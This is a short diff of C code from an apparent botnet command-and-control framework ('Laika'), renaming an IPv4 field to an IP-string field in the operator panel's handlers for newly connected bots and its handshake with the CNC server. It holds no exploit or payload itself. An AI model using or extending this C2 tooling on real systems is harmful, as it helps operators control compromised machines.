@@ -49,7 +49,7 @@ void shellC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) 
 
 
 void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipv4[LAIKA_IPV4_LEN];
+    char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipStr[LAIKA_IPSTR_LEN];
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
     tShell_client *client = (tShell_client*)uData;
     tShell_peer *bot;
@@ -58,10 +58,10 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     /* read newly connected peer's pubKey */
     laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
 
-    /* read hostname & ipv4 */
+    /* read hostname & ip str */
     laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
     laikaS_read(&peer->sock, inet, LAIKA_INET_LEN);
-    laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);
+    laikaS_read(&peer->sock, ipStr, LAIKA_IPSTR_LEN);
 
     /* read peer's peerType & osType */
     type = laikaS_readByte(&peer->sock);
@@ -72,7 +72,7 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
         return;
 
     /* create peer */
-    bot = shellP_newPeer(type, osType, pubKey, hostname, inet, ipv4);
+    bot = shellP_newPeer(type, osType, pubKey, hostname, inet, ipStr);
 
     /* add peer to client */
     shellC_addPeer(client, bot);
@@ -151,7 +151,7 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
         shellC_handleAddPeer,
-        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t) + sizeof(uint8_t),
+        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPSTR_LEN + sizeof(uint8_t) + sizeof(uint8_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
         shellC_handleRmvPeer,
@@ -258,9 +258,9 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_OSTYPE);
     laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */
 
-    /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
+    /* write stub hostname & ip str (since we're a panel/dummy client, cnc doesn't need this information really) */
     laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
-    laikaS_zeroWrite(sock, LAIKA_IPV4_LEN);
+    laikaS_zeroWrite(sock, LAIKA_INET_LEN);
     laikaS_endOutPacket(client->peer);
     laikaS_setSecure(client->peer, true); /* after our handshake, all packet bodies are encrypted */
 
